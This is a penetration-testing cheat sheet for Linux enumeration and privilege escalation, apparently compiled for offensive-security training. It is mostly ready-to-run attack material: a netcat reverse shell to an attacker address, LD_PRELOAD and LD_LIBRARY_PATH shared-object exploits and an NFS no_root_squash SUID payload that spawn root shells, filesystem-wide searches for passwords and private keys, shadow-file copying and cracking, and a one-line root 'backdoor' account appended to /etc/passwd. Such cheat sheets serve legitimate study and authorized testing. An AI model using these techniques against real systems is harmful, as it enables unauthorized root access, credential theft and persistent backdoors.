# Linux Enumeration 
**Summary:**

- [Linux Enumeration](#linux-enumeration)
  - [Spawn Interactive Shell and set env](#spawn-interactive-shell-and-set-env)
  - [SSH key](#ssh-key)
    - [On target](#on-target)
    - [Attacker](#attacker)
    - [Check ssh key](#check-ssh-key)
  - [Get info](#get-info)
  - [Process information](#process-information)
  - [Service only available from inside](#service-only-available-from-inside)
  - [Users and group information](#users-and-group-information)
  - [Cronjob](#cronjob)
  - [Exploit sudo](#exploit-sudo)
    - [Exploit misconfiguration](#exploit-misconfiguration)
  - [Leverage LD_PRELOAD and LD_LIBRARY_PATH](#leverage-ld_preload-and-ld_library_path)
    - [Exploit LD_PRELOAD](#exploit-ld_preload)
    - [Exploit LD_LIBRARY_PATH](#exploit-ld_library_path)
    - [SUDO_KILLER](#sudo_killer)
  - [Sensitive files](#sensitive-files)
    - [Find password](#find-password)
    - [SSH Key](#ssh-key-1)
    - [JKS & JCEKS](#jks--jceks)
      - [Open files](#open-files)
  - [Unmounted filesystems](#unmounted-filesystems)
  - [SUID](#suid)
    - [Writable file and nobody files](#writable-file-and-nobody-files)
    - [Writable by current user](#writable-by-current-user)
    - [world-writeable folders](#world-writeable-folders)
    - [Any script files that we can modify?](#any-script-files-that-we-can-modify)
    - [Any service running by root?](#any-service-running-by-root)
      - [Exploit SUID/SGUIT](#exploit-suidsguit)
  - [Linux capability](#linux-capability)
    - [Example](#example)
  - [Exploit Path](#exploit-path)
  - [NFS priv esc](#nfs-priv-esc)
    - [Exploit no_root_squash](#exploit-no_root_squash)
  - [World writable directories](#world-writable-directories)
  - [Weak File Permissions](#weak-file-permissions)
    - [Crack shadow Hash](#crack-shadow-hash)
    - [Change user password](#change-user-password)
    - [Edit passwd](#edit-passwd)
  - [Id hash](#id-hash)
  - [SELinux](#selinux)
  - [Apparmor](#apparmor)
  - [Source](#source)

## Spawn Interactive Shell and set env  

```bash
> python -c 'import pty;pty.spawn("/bin/bash");'  
> python3 -c 'import pty;pty.spawn("/bin/bash");'  

# ctrl z  
$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
$ stty raw -echo; fg  [ENTER]  [ENTER]

> python -c 'import pty;pty.spawn("/bin/bash");'  
> stty rows ROWS cols COLS
> echo $TERM  
> export TERM=xterm-256color 
```

Restricted bash:

```bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  
```

## SSH key

### On target

```sh
ssh-keygen
mkdir -m 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Attacker

```bash
ssh -i id_rsa USERNAME@IP_ADDRESS
```

### Check ssh key

```bash
ssh-keyscan IP_ADDRESS
```

## Get info

OS & Architecture & Kernel version:

- `uname -a`
- `cat /proc/version`
- `cat /etc/issue`
- `lsb_release -a`
- `env`

## Process information

| Command   | Description                                                                                                                                                                 |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ps -A`   | View all running processes                                                                                                                                                  |
| `ps axjf` | View process tree                                                                                                                                                           |
| `ps auxf` | Show processes:<ul><li>for all users (a)</li><li>for the user that launched the process (u)</li><li>that are not attached to a terminal (x)</li><li>as a tree (f)</li></ul> |

## Service only available from inside

- `netstat -anp`: shows all listening ports and established connections.
- `netstat -lntp`: shows all listening ports, processes and TCP protocol.
- `netstat -lnup`: shows all listening ports, processes and UDP protocol.
- `netstat -s`: shows list network usage statistics by protocol.
- `netstat -i`: shows interface statistics.

## Users and group information

- `id`
- `cat /etc/passwd | cut -d ":" -f1`
- `egrep -v "nologin|false" /etc/passwd | cut -d ":" -f1`
- `ls /home`
- `awk -F: '{if($3>999)print $1":"$6":"$7}' < /etc/passwd`
- `awk -F: '{if($4!="")print$1":"$4}' < /etc/group`

## Cronjob

- `crontab -l`
- `ls -alh /etc/cron*`
- `ls -alh /var/spool/cron`
- `ls -alh /etc/at.*`
- `ls -al /etc/ | grep cron`

## Exploit sudo

`sudo -l`

### Exploit misconfiguration

<https://gtfobins.github.io>

## Leverage LD_PRELOAD and LD_LIBRARY_PATH

If the output of `sudo -l` contains:

- `env_keep+=LD_PRELOAD`
- `env_keep+=LD_LIBRARY_PATH`

### Exploit LD_PRELOAD

nano exploit.c

```C
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Compile code:

```bash
gcc exploit.c -o /tmp/exploit.so -nostartfiles -fPIC -shared
```

Run the program with sudo and the env var:

```bash
sudo LD_PRELOAD=/tmp/exploit.so PROGRAM_NAME
```

### Exploit LD_LIBRARY_PATH

nano exploit.c

```C
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

List the library load by the target program:

```bash
ldd $(which PROGRAM_NAME)
```

Compile code:

```bash
gcc exploit.c -o /tmp/LIB_NAME.so -nostartfiles -fPIC -shared
```

Run the program with sudo and the env var:

```bash
sudo LD_LIBRARY_PATH=/tmp PROGRAM_NAME
```

### SUDO_KILLER

```bash
git clone https://github.com/TH3xACE/SUDO_KILLER
```

Online mode:

```bash
./sudo_killer.sh -c -e -r report.txt -p /tmp
```

Offline mode:

```bash
./sudo_killer.sh -c -i /path/sk_offline.txt
```

## Sensitive files

### Find password

```bash
grep -rnw '/' -ie 'pass' --color=always 2>/dev/null 
grep -rnw '/' -ie 'password' --color=always 2>/dev/null 
grep -rnw '/' -ie 'DB_PASS' --color=always 2>/dev/null
grep -rnw '/' -ie 'DB_PASSWORD' --color=always 2>/dev/null
grep -rnw '/' -ie 'DB_USER' --color=always 2>/dev/null
grep -rnw '/' -ie 'PRIVATE KEY' --color=always 2>/dev/null

find / -type f -regex '.*\.\(php\|log\|xml\|txt\)' -exec grep --color=auto  -i 'password' {} \; -print 2>/dev/null
```

### SSH Key

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

### JKS & JCEKS

```bash
find / -name *.jks 2>/dev/null
find / -name *.jceks 2>/dev/null
find / -name *.keystore 2>/dev/null
```

#### Open files

```bash
keytool -list -keystore FILE_NAME.jceks -storetype JCEKS
keytool -list -keystore FILE_NAME.jks -storetype JKS
```

## Unmounted filesystems

Check any restricitions on any folders  

```bash
mount -l        >> any no exec or no suid?  
```

Check any unmounted drives

```bash
cat /etc/fstab  
```

## SUID

Sticky bit - Find all the SUID/SGID executables.

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```  

Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  

```bash
find / -perm -1000 -type d 2>/dev/null   
```

SGID (chmod 2000) - run as the group, not the user who started it.

```bash
find / -perm -g=s -type f 2>/dev/null    
```

SUID (chmod 4000) - run as the owner, not the user who started it.

```bash
find / -perm -u=s -type f 2>/dev/null
```

SGID or SUID < full search

```bash
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null 
```

Looks in 'common' places: /bin, /sbin < quicker  

```bash
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
```

### Writable file and nobody files

world-writeable files

```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   
```

Noowner files  

```bash
find /dir -xdev \( -nouser -o -nogroup \) -print 
```

### Writable by current user

```bash
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/null  
```

### world-writeable folders

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

### Any script files that we can modify?

find all python file that can be write by us

```bash
find / -writable -type f -name "*.py" 2>/dev/null  

ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone  
ls -aRl / | awk '$1 ~ /^..w/' 2>/dev/null       # Owner  
ls -aRl / | awk '$1 ~ /^.....w/' 2>/dev/null    # Group  
ls -aRl / | awk '$1 ~ /w.$/' 2>/dev/null        # Other  

find / -readable -type f 2>/dev/null               # Anyone  
find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone  
```

### Any service running by root?

```bash
ps aux|grep "root"  

/usr/bin/journalctl (Which is normally not readable by a user)              << cron job?  
```

#### Exploit SUID/SGUIT

> Execute binary without the full path

1. Create a binary with the same name as the program executed by the binary
2. Run the vulnerable binary: `PATH=.:$PATH VULN_BINARY`

> Bash versions **<4.2-048**

Get version:

```bash
/bin/bash --version
```

Exploit:

```bash
function LOAD_BIN_FULL_PATH { /bin/bash -p; }
export -f LOAD_BIN_FULL_PATH
./VULN_BIN
```

## Linux capability

```bash
find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
```

or

```bash
getcap -r / 2>/dev/null
```

### Example

```ss
setcap cap_setuid+ep vim
```

```sh
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Exploit Path

Look for directories in `$PATH` that are writable:

```sh
for i in $(echo $PATH | tr ":" " "); do [ -w $i ] && echo "$i" ; done
```

Look for script in `$PATH` that are writable:

```sh
scriptName="SCRIPT"
for i in $(echo $PATH | tr ":" " "); do [ -w $i/$scriptName ] && echo "$i/$scriptName" ; done
```

Find a writable dir:

```sh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Exploit:

```sh
export PATH="NEW_PATH:$PATH"
echo "/bin/bash"> NEW_PATH/FILE_LOADED
chmod +x NEW_PATH/FILE_LOADED
```

## NFS priv esc

NFS configuration:

```bash
cat /etc/exports
showmount -e 127.0.0.1
```

### Exploit no_root_squash

NFS configuration vulnerable:

```sh
cat /etc/exports | grep "no_root_squash"
```

First check if the target machine has any NFS shares

```bash
showmount -e IP_ADDRESS
```

If it does, then mount it to you filesystem

```bash
mkdir /tmp/mntDrive
sudo mount -o rw IP_ADDRESS:/PATH /tmp/mntDrive/
sudo mount -o rw,vers=2 IP_ADDRESS:/PATH /tmp/mntDrive/
```

Create payload:

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(){
    setresuid(0,0,0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc exploit.c -o exploit
cp exploit /tmp/mntDrive/exploit
cd /tmp/mntDrive
sudo chown 0:0 exploit
sudo chmod +sx exploit
```

## World writable directories

```path
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```

## Weak File Permissions

### Crack shadow Hash

```sh
cp /etc/passwd .
cp /etc/shadow .
unshadow passwd shadow > hash
john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 
```

### Change user password

List of hashing algorithm:

| Tag    | hashing algorithm |
| ------ | ----------------- |
| `$1$`  | MD5               |
| `$2a$` | Blowfish          |
| `$2y$` | Blowfish          |
| `$5$`  | SHA-256           |
| `$6$`  | SHA-512           |

Generate user password:

```sh
mkpasswd -m md5     "PASSWORD"
mkpasswd -m sha-256 "PASSWORD"
mkpasswd -m sha-512 "PASSWORD"
```

Edit shadows:

```bash
nano /etc/shadow 
```

### Edit passwd

Setting the root password:

```bash
cp /etc/passwd /tmp/passwd
replace "root:x:" "root:$(openssl passwd toor):" -- /tmp/passwd
mv /tmp/passwd /etc/passwd
```

or

Adding a new the root user:

```bash
echo "backdoor:$(openssl passwd toor):0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Id hash

```bash
hash-identifier
```

## SELinux

Check if SELinux is enable:

```bash
getenforce
```

## Apparmor

```bash
ls -la  /etc/apparmor.d
```

```bash
sudo aa-status
```

## Source

- <https://github.com/diego-treitos/linux-smart-enumeration>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- <https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html>
- <https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb>
- <https://tryhackme.com/room/linprivesc>
